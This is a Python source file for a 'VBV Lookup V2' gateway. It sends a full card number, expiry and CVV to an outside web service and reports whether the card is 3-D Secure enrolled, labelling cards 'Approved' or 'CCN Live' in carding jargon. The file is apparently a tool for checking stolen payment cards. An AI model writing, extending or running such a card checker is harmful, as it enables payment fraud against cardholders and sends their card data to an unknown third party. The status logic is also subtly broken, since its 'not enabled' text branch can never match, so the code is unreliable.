"""
VBV Lookup V2 Gateway
API Endpoint: https://vbv-app.onrender.com/key=voidboy
"""
import aiohttp
import asyncio
import json

async def vbv2_check(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    VBV Lookup V2 gateway
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str, 'vbv_status': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = f"https://vbv-app.onrender.com/key=voidboy/cc={full_card}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=40)
            ) as resp:
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Parse as text
                    if "enabled" in api_response.lower():
                        return {
                            'status': 'Approved',
                            'response': api_response[:200],
                            'vbv_status': 'VBV Enabled'
                        }
                    elif "not enabled" in api_response.lower():
                        return {
                            'status': 'CCN Live',
                            'response': api_response[:200],
                            'vbv_status': 'VBV Not Enabled'
                        }
                    else:
                        return {
                            'status': 'Unknown',
                            'response': api_response[:200],
                            'vbv_status': 'Unknown'
                        }
                
                # Extract data
                status = data.get("status", "Unknown")
                response = data.get("response", "No response")
                vbv_status = data.get("vbv", "Unknown")
                message = data.get("message", response)
                
                # Determine final status
                if isinstance(vbv_status, str):
                    lower_vbv = vbv_status.lower()
                    if "enabled" in lower_vbv or "yes" in lower_vbv or "true" in lower_vbv:
                        final_status = "Approved"
                        final_vbv = "VBV Enabled ✅"
                    elif "not enabled" in lower_vbv or "no" in lower_vbv or "false" in lower_vbv:
                        final_status = "CCN Live"
                        final_vbv = "VBV Not Enabled ❌"
                    else:
                        final_status = "Unknown"
                        final_vbv = vbv_status
                else:
                    final_status = "Unknown"
                    final_vbv = "Unknown"
                
                return {
                    'status': final_status,
                    'response': message or response,
                    'vbv_status': final_vbv
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out',
            'vbv_status': 'Unknown'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'Error: {str(e)}',
            'vbv_status': 'Unknown'
        }
